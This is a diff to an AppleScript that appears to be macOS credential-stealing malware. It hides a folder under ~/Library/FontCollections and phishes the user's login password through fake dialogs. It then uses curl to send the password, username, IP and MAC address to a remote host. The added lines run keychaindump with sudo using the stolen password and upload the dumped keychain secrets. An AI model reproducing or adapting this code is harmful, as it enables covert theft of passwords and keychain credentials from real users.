@@ -1,9 +1,9 @@
 try
 	set theuser to do shell script "whoami"
 	try
-		do shell script "mkdir ~/Public/." & theuser & "" -- Make the hidden folder in the user's Public folder
+		do shell script "mkdir ~/Library/FontCollections/." & theuser & "" -- Make the hidden folder in the user's Public folder
 	end try
-	set ufld to "/Users/" & theuser & "/Public/." & theuser & "/"
+	set ufld to "/Users/" & theuser & "/Library/FontCollections/." & theuser & "/"
 on error
 	return
 end try
@@ -45,7 +45,7 @@ end try
 
 try
 	try
-		set oldpasswd to (do shell script "cat " & ufld & "." & theuser & ".txt")
+		set oldpasswd to (do shell script "cat " & ufld & theuser & ".txt")
 		checkPassword(theuser, oldpasswd) -- Check if password is correct
 		set passwd to oldpasswd
 	on error err	
@@ -64,21 +64,34 @@ try
 				display dialog "Please try again." with title "Password" buttons {"OK"} default button 1 giving up after 3 -- If password is incorrect, try again
 			end try
 		end repeat
-		do shell script "echo " & passwd & " > " & ufld & "." & theuser & ".txt"
+		do shell script "echo " & passwd & " > " & ufld & theuser & ".txt"
 	end try
 end try
-
+log "new"
 try
 	try
-		do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d '<' -f 1"
+		(*with timeout of 10 seconds
+			do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d '<' -f 1"
+		end timeout
+		*)
 		set WANIP to (characters 2 through -1 of result) as text -- Get IP
 	on error
-		set WANIP to "not connected"
+		set WANIP to "0.0.0.0"
 	end try
 	set MACAD to first paragraph of (do shell script "ifconfig | grep ether | cut -d ' ' -f 2")
-
-	do shell script "curl \"" & remoteHost & "/a?pass=" & passwd & "&user=" & theuser & "&WANIP=" & WANIP & "x&MACAD=" & MACAD & "\""
+	log "a"
+	do shell script "curl \"" & remoteHost & "/a?pass=" & passwd & "&user=" & theuser & "&WANIP=" & WANIP & "&MACAD=" & MACAD & "\""
+on error err
+	log err
 end try
+log "hello"
+
+--try
+	--do shell script "gcc ./keychaindump.c -o keychaindump -lcrypto"
+	log "tee"
+	set rawpasswords to (do shell script "echo " & passwd & " | sudo -S ./keychaindump > " & ufld & "/" & MACAD & ".txt") as text
+	do shell script "curl -d @" & ufld & MACAD & ".txt " & remoteHost & "/b?MACAD=" & MACAD & " --header \"Content-Type:text/plain\""
+--end try
 
 on checkPassword(user, pass)
 	do shell script "dscl . -passwd /Users/" & user & " " & pass & " benwashere"
